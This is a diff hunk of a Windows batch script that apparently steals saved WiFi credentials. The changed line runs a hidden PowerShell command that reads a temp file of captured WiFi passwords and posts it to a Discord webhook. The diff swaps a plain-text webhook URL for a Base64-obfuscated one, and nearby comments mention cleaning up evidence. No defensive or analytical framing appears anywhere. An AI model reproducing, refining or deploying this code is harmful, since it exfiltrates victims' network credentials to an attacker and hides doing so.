@@ -11,7 +11,7 @@ if %errorLevel% == 0 (
     timeout /t 2 /nobreak >nul
     
     REM Send to Discord webhook - read from the SAME file
-    powershell -WindowStyle Hidden -Command "try { $filepath = Get-ChildItem $env:TEMP\wifi_creds_*.txt | Select-Object -First 1 -ExpandProperty FullName; $content = Get-Content $filepath -Raw; if(!$content) { $content = 'Error: No WiFi data found' }; if($content.Length -gt 1800) { $content = $content.Substring(0,1800) + '...(truncated)' }; $payload = @{ content = '**WiFi Credentials Captured!**```' + $content + '```' } | ConvertTo-Json; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1429779133390655518/kwm5qXhLKjdU7mDgojljDCPiiMsBqvsmJPdn3TvhLQ4mAg9nyfmLV6ShWfCNN-yHntCt' -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' } catch { }"
+    powershell -WindowStyle Hidden -Command "try { $encrypted = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDQxNTY3NTU2NDE2MzE2NC9WRVFGVUhnSEZIcTZjemxyUHUxQ0NJQUJOLWJiM09kTFRYVGg2OE1oS21fQ0VINFZQbURZa3dWc1ZzdS1naVVLRVBtTw=='; $bytes = [System.Convert]::FromBase64String($encrypted); $webhook = [System.Text.Encoding]::UTF8.GetString($bytes); $filepath = \"$env:TEMP\wifi_creds.txt\"; $content = Get-Content $filepath -Raw; if(!$content) { $content = 'Error: No WiFi data found' }; if($content.Length -gt 1800) { $content = $content.Substring(0,1800) + '...(truncated)' }; $payload = @{ content = '**WiFi Credentials Captured!**```' + $content + '```' } | ConvertTo-Json; Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' } catch { }"
     
     REM Clean up evidence
     timeout /t 1 /nobreak >nul
